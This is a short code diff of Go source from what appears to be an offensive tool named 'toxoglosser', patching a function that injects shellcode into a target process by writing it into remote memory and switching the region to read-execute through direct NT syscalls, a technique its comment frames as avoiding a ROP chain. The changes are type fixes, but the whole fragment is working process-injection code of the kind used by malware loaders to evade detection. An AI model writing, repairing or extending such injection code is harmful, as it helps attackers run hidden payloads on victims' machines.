@@ -147,6 +147,7 @@ import (
 	"unsafe"
 	_ "embed"
 
+	"golang.org/x/sys/windows"
 	"toxoglosser/payloads"
 	"toxoglosser/core"
 	"toxoglosser/utils"
@@ -225,7 +226,7 @@ func inject(pid C.DWORD, processName string, payload []byte) bool {
 		uintptr(unsafe.Pointer(&bytesWritten)),
 		0,
 	)
-	if writeErr.(syscall.Errno) != 0 || writeRet == 0 {
+	if writeErr != 0 || writeRet == 0 {
 		fmt.Fprintf(os.Stderr, "[-] Failed to write shellcode to %s (%d): %v\n", processName, pid, writeErr)
 		return false
 	}
@@ -234,7 +235,7 @@ func inject(pid C.DWORD, processName string, payload []byte) bool {
 	// Change memory protection to RX (Read-Execute) using direct syscalls instead of ROP chain
 	oldProtect := uint32(0)
 	regionSize := uintptr(len(payload))
-	err = core.NtProtectVirtualMemory(hProcess, &shellcodeAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect)
+	err = core.NtProtectVirtualMemory(windows.Handle(hProcess), &shellcodeAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "[-] Failed to change memory protection in %s (%d): %v\n", processName, pid, err)
 		return false
